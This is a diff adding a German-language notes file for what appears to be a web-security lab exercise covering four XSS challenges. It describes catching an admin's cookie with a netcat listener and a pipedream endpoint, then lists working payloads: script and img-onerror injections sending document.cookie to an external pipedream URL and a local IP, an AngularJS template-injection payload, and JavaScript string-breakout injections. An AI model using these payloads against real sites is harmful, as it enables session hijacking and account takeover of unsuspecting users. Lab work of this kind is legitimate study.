@@ -1,0 +1,48 @@
+Aufgabe1
+
+XSS_1:
+
+1. Versuch war über einen selbst erstellten webserver durch die python library: BaseHTTPRequest
+Auf diesem server sind zwar nach erfolgreicher injection die get request erschienen allerdings war der cookie des admin
+in dem request seltsamerweise nicht hinterlegt.
+2. Versuch war über ein port listener befehl : sudo nc -lvp 80 welcher request am port 80 abgefangen hat.
+auch hier hat man die erzeugten reqeuest gesehen doch auch hier war der cookie des admins nicht mit dabei trotz eigentlich korrekter injection.
+3. Versuch war ueber die website pipedream mit welcher man sich trigger erzeugen konnte die mit einem link kommen welchen man nutzten kann um diesen trigger letztendlich zu triggern.
+Dieser versuch hat dann auch funktioniert und in dem event welches getriggert wurde konnte man den cookie aka sessionid auslesen.
+die injection wurde ausprobiert mit einem script und einem image tag.
+
+
+XSS_2:
+
+test"> status = test</i><script>alert(123)</script><i>
+
+test"> status = test</i><script>var i=new Image;i.src="https://eoj60fi37410677.m.pipedream.net/?"+document.cookie;
+
+
+"></i><script>var i=new Image;i.src="https://eoj60fi37410677.m.pipedream.net/?"+document.cookie;</script>
+
+"></i><img src=x onerror=this.src="https://eoj60fi37410677.m.pipedream.net/?"+document.cookie;>
+
+"></i><img src=x onerror='this.src="https://eoj60fi37410677.m.pipedream.net/?"+document.cookie' >
+
+
+XSS_3:
+
+{{$on.constructor('alert(1)')()}}
+
+
+
+
+
+XSS_4:
+
+3'; src=xk; onerror=this.src='https://eoj60fi37410677.m.pipedream.net/?'+document.cookie; var num2 = '4
+
+'; var i=new Image;i.src="https://eoj60fi37410677.m.pipedream.net/?"+document.cookie;var number2 = '3
+
+';
+alert(document.cookie);
+var i=new Image;
+i.src="http://192.168.0.18:8888/?"+document.cookie;
+var number2 = '3
+
